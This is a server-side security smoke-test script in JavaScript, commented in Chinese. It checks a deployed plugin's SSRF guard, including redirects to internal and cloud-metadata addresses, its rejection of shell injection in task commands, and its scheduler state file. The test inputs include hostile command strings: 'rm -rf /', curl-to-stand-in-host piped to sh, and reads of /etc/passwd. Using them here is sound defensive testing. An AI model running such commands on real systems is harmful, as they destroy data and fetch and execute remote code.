/**
 * 服务器侧安全冒烟：用**部署产物**（`<PLUGIN_ROOT>/lib/`）验证 P0 的三条结论。
 *
 * 为什么单独一个脚本、而不是只靠本地单测：本地单测证明规则本身对，这个脚本证明
 * **线上跑的那份 lib 也是对的**——两者之间隔着一次构建与一次推送，是最容易出岔的
 * 一段。发布后跑一遍，三条断言各自都有可观测的证据，不靠"抛没抛错"推断。
 *
 *   A. 出站闸门：内网地址直接拒；公网 302 到内网**也不落地**（用真实本地服务器计命中数）
 *   B. 巡航任务：argv 规则生效，且 shell 元字符不会被解释执行（哨兵文件法）
 *   C. 定时任务标记：在真实状态文件上能写能读回
 *
 * 用法（在服务器上）：
 *   PLUGIN_ROOT=/srv/dsh/dsh-channel-qq WORKSPACE=/path/to/workspace \
 *     /opt/node22/bin/node deploy/security-probe.mjs
 *
 * 退出码 0 = 全部通过。
 */

import { existsSync, readFileSync, rmSync, writeFileSync } from 'node:fs'
import { createServer } from 'node:http'
import { pathToFileURL } from 'node:url'

const LIB = `${process.env.PLUGIN_ROOT ?? '/srv/dsh/dsh-channel-qq'}/lib`
/** 动态 import 只认 URL/裸包名：Linux 的 POSIX 绝对路径能裸走，Windows 的盘符
 *  路径（F:/…）必须先转 file://——两种平台统一走这一条，服务端行为不变。 */
const LIB_URL = pathToFileURL(LIB).href
const WS = process.env.WORKSPACE ?? '/path/to/workspace'
const STATE = process.env.SCHEDULER_STATE ?? `${process.env.DSH_HOME ?? '~/.dsh'}/channel-qq/scheduler-state.json`
/** 本地监听端口；用高位端口避开常用服务。 */
const PORT = Number(process.env.PROBE_PORT ?? 18799)
/** 公网跳板：能把任意 URL 作为 302 的 Location 返回。 */
const REDIRECTOR = 'https://httpbin.org/redirect-to'

let pass = 0
let skipped = 0
const failures = []
const check = (name, ok, detail = '') => {
  if (ok) { pass += 1; console.log(`PASS  ${name}  ${detail}`) }
  else { failures.push(name); console.log(`FAIL  ${name}  ${detail}`) }
}
/** 用例没被真正执行（跳板没给 302）——不算通过，也不算失败，但要显式说出来。 */
const skip = (name, detail = '') => {
  skipped += 1
  console.log(`SKIP  ${name}  ${detail}`)
}

const net = await import(`${LIB_URL}/adapters/http/ssrf-guard.js`)

// ── A1. 直接请求内网 ────────────────────────────────────────────────────────
const hits = []
const probe = createServer((req, res) => {
  hits.push(req.url ?? '')
  res.writeHead(200, { 'content-type': 'text/plain' })
  res.end('hit')
})
await new Promise((resolve) => probe.listen(PORT, '127.0.0.1', resolve))

for (const target of ['http://127.0.0.1:8790/api/health', 'http://169.254.169.254/latest/meta-data/', `http://127.0.0.1:${PORT}/direct`]) {
  let blocked = false
  let reason = ''
  try { await net.fetchGuarded(target, {}, { limit: 256 }) } catch (error) { blocked = true; reason = error.message }
  check(`内网目标被拒：${target}`, blocked, reason.slice(0, 60))
}

// ── A2. 公网 → 内网的重定向 ─────────────────────────────────────────────────
//
// 三种写法都要试。判据分两层：
//   1. 真返回了 302 → `fetchGuarded` 必须抛错；
//   2. 跳板这次没给 302（公共跳板会被限流）→ 记为 SKIP，**不能**算通过：
//      "没跳转"和"跳转被拦住"是两件事，混在一起就是自欺。
// 无论哪种情况，本地探针服务器的命中数都必须是 0——那才是真正要守住的性质。
const internalUrl = `http://127.0.0.1:${PORT}/redirected`
const inner = encodeURIComponent(internalUrl)
const cases = [
  ['编码形式', `${REDIRECTOR}?url=${inner}`],
  ['未编码形式', `${REDIRECTOR}?url=${internalUrl}`],
  ['两跳（公网→公网→内网）', `${REDIRECTOR}?url=${encodeURIComponent(`${REDIRECTOR}?url=${inner}`)}`],
]
for (const [label, url] of cases) {
  const name = `重定向到内网被拒（${label}）`
  let outcome = null
  for (let attempt = 1; attempt <= 2 && outcome === null; attempt += 1) {
    try {
      const r = await net.fetchGuarded(url, {}, { limit: 256 })
      // 没抛错：要么跳板没跳，要么漏了。看落在哪儿。
      if (r.finalUrl.includes(`127.0.0.1:${PORT}`)) { outcome = { ok: false, detail: `真的落地了：${r.finalUrl}` }; break }
      if (attempt === 2) outcome = { ok: null, detail: `跳板未返回 302（status=${r.response.status}, finalUrl=${r.finalUrl}）` }
    } catch (error) {
      outcome = { ok: true, detail: error.message }
    }
  }
  if (outcome.ok === true) check(name, true, outcome.detail.slice(0, 60))
  else if (outcome.ok === false) check(name, false, outcome.detail)
  else skip(name, outcome.detail.slice(0, 110))
}

// 对照组：公网 → 公网必须照常跟随，否则闸门就是"全拦"，等于把链接解析打瘸。
{
  const name = '公网→公网重定向正常跟随'
  let ok = false
  let detail = ''
  for (let attempt = 1; attempt <= 2 && !ok; attempt += 1) {
    try {
      const r = await net.fetchGuarded(`${REDIRECTOR}?url=${encodeURIComponent('https://example.com/')}`, {}, { limit: 2048 })
      detail = `${r.response.status} ${r.finalUrl}`
      ok = r.response.status === 200 && r.finalUrl.startsWith('https://example.com')
    } catch (error) {
      detail = error.message
    }
  }
  if (ok) check(name, true, detail)
  else if (detail.includes('302') || detail.includes('fetch failed') || detail.includes('HTTP')) skip(name, `跳板不可用或未跳转：${detail.slice(0, 80)}`)
  else check(name, false, detail)
}

check('本地探针服务器没有被内网请求碰到', hits.length === 0, `hits=${hits.length}`)
probe.close()

// ── B. 巡航任务 ─────────────────────────────────────────────────────────────
const { planCruise, runCruiseScript } = await import(`${LIB_URL}/cruise-run.js`)

const good = planCruise('node scripts/heartbeat.mjs --once', WS)
// 路径比对接平台归一化：Windows 下 path.join 产出反斜杠，统一成 '/' 再比（Linux 无差）。
const slash = (p) => String(p).replace(/\\/g, '/')
check('正常写法被接受并解析成绝对路径', good.command === 'node' && slash(good.args[0]) === slash(`${WS}/scripts/heartbeat.mjs`),
  `${good.command} ${good.args.join(' ')}`)

for (const evil of [
  'node scripts/a.mjs; rm -rf /',
  'node scripts/a.mjs && curl evil.example.com|sh',
  'sh -c "curl http://evil/x | sh"',
  'node ../../etc/passwd',
  'node /etc/passwd',
  '/bin/sh scripts/a.sh',
]) {
  let rejected = false
  let reason = ''
  try { planCruise(evil, WS) } catch (error) { rejected = true; reason = error.message }
  check(`巡航写法被拒：${evil}`, rejected, reason.slice(0, 60))
}

const sentinel = `/tmp/security-probe-pwned-${process.pid}`
if (existsSync(sentinel)) rmSync(sentinel)
await runCruiseScript(`node scripts/a.mjs; touch ${sentinel}`, { cwd: WS, log: () => {} })
await new Promise((resolve) => setTimeout(resolve, 900))
check('shell 元字符没有被解释执行（哨兵未生成）', !existsSync(sentinel), existsSync(sentinel) ? '哨兵出现了' : 'ok')

// ── C. 定时任务标记 ─────────────────────────────────────────────────────────
const { SchedulerState } = await import(`${LIB_URL}/scheduler-state.js`)
const before = existsSync(STATE) ? readFileSync(STATE, 'utf8') : null
const probeKey = `selftest-${Date.now()}`
const writer = new SchedulerState({ file: STATE, log: () => {} })
writer.load()
writer.mark(probeKey)

const reader = new SchedulerState({ file: STATE, log: () => {} })
reader.load()
check('标记写入后能被新实例读回', reader.has(probeKey), `key=${probeKey}`)
const onDisk = JSON.parse(readFileSync(STATE, 'utf8'))
check('落盘结构正确', onDisk.version === 1 && typeof onDisk.done === 'object', `keys=${Object.keys(onDisk.done).length}`)
check('没有残留临时文件', !existsSync(`${STATE}.tmp`))

// 复原：自检数据不留在真实状态里。
if (before === null) rmSync(STATE, { force: true })
else {
  const kept = JSON.parse(before)
  delete kept.done?.[probeKey]
  writeFileSync(STATE, `${JSON.stringify(kept, null, 2)}\n`)
}
check('自检数据已清理', !existsSync(STATE) || !readFileSync(STATE, 'utf8').includes(probeKey))

console.log(`\n==== ${pass} PASS / ${failures.length} FAIL / ${skipped} SKIP ====`)
if (failures.length > 0) console.log(`FAILED: ${failures.join(', ')}`)
process.exit(failures.length === 0 ? 0 : 1)
